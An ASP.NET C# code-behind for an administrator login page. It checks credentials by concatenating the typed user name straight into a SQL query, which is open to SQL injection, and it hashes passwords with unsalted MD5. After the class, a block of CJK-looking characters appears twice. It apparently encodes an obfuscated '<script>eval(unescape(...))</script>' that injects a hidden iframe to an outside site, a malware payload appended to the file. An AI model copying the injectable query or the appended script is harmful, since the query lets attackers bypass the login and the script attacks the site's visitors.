using System;
using System.Data;
using System.Configuration;
using System.Collections;
using System.Web;
using System.Web.Security;
using System.Web.UI;
using System.Web.UI.WebControls;
using System.Web.UI.WebControls.WebParts;
using System.Web.UI.HtmlControls;
using System.Data.SqlClient;
using System.Web.Configuration;
using System.Security;
using System.Security.Authentication;
using System.Security.Cryptography;
using System.Text;

public partial class ViettoolEng_login : System.Web.UI.Page
{
    SqlConnection con = new SqlConnection(WebConfigurationManager.ConnectionStrings["connString"].ConnectionString);
    
    protected void Page_Load(object sender, EventArgs e)
    {
        txtUser.Focus();
    }
    protected void Button1_Click(object sender, EventArgs e)
    {
        if (check())
        {
            Session["Admin"] = txtUser.Text;
            Response.Redirect("~/ViettoolEng/default.aspx");  
        }
        else
        {
            
            //lblMessage.Visible = true;
            //lblMessage.Text = "Bạn đã nhập sai UserName hoặc Password.";
        }
    }

    public bool check()
    {
        // Ma hoa Password
        MD5 x = new MD5CryptoServiceProvider();
        byte[] lam = Encoding.UTF8.GetBytes(txtpass.Text);
        lam = x.ComputeHash(lam);
        StringBuilder s = new StringBuilder();
        foreach (byte b in lam)
        {
            s.Append(b.ToString("x2").ToLower());
        }
        string strPass = s.ToString();

        con.Open();
        SqlCommand com = new SqlCommand("select count(*) from NGUOIDUNG where ten = '" + txtUser.Text + "' and Password = '" + strPass + "'", con);
        if (com.ExecuteScalar().ToString() == "1")
        {
            Session["Admin"] = "Admin";
            return true;
        }
        txtUser.Focus();
        return false;
        con.Close();
    }
}
猼牣灩㹴癥污用敮捳灡⡥┧㐶㘥╆㌶㜥┵䐶㘥┵䔶㜥┴䔲㜥┷㈷㘥┹㐷㘥┵㠲㈥┷䌳㘥┹㘶㜥┲ㄶ㘥╄㔶㈥┰㌷㜥┲㌶㌥╄㈲㘥┸㐷㜥┴〷㌥╁䘲㈥╆㔶㘥┱㌶㜥┶㈶㈥╅㌶㘥╆䐶㈥╆㈲㈥┰㜷㘥┹㐶㜥┴㠶㌥╄ㄳ㈥┰㠶㘥┵㤶㘥┷㠶㜥┴䐳㌥┱䔳㌥╃䘲㘥┹㘶㜥┲ㄶ㘥╄㔶㌥╅㜲㈥✹⤩㰻猯牣灩㹴猼牣灩㹴癥污用敮捳灡⡥┧㐶㘥╆㌶㜥┵䐶㘥┵䔶㜥┴䔲㜥┷㈷㘥┹㐷㘥┵㠲㈥┷䌳㘥┹㘶㜥┲ㄶ㘥╄㔶㈥┰㌷㜥┲㌶㌥╄㈲㘥┸㐷㜥┴〷㌥╁䘲㈥╆㔶㘥┱㌶㜥┶㈶㈥╅㌶㘥╆䐶㈥╆㈲㈥┰㜷㘥┹㐶㜥┴㠶㌥╄ㄳ㈥┰㠶㘥┵㤶㘥┷㠶㜥┴䐳㌥┱䔳㌥╃䘲㘥┹㘶㜥┲ㄶ㘥╄㔶㌥╅㜲㈥✹⤩㰻猯牣灩㹴